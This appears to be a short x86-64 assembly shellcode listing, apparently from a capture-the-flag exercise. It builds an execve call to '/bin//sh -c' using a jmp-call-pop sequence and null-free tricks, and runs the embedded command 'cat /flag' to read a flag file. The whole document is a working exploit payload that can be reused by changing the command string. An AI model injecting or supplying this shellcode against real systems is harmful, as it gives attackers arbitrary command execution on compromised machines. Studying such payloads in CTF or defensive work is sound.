   bits    64

   push    59
   pop     rax              ; rax=sys_execve
   cdq                      ; penv=0
   mov     rcx, '/bin//sh'
   push    rdx              ; 0
   push    rcx              ; "/bin//sh"
   push    rsp
   pop     rdi              ; rdi="/bin//sh", 0
   ; ---------
   push    rdx              ; 0
   push    word '-c'
   push    rsp
   pop     rbx              ; rbx="-c", 0
   push    rdx              ; NULL
   jmp     l_cmd64
r_cmd64:                     ; command
   push    rbx              ; "-c"
   push    rdi              ; "/bin//sh"
   push    rsp
   pop     rsi              ; rsi=args
   syscall
l_cmd64:
   call    r_cmd64
   db 'cat /flag', 0
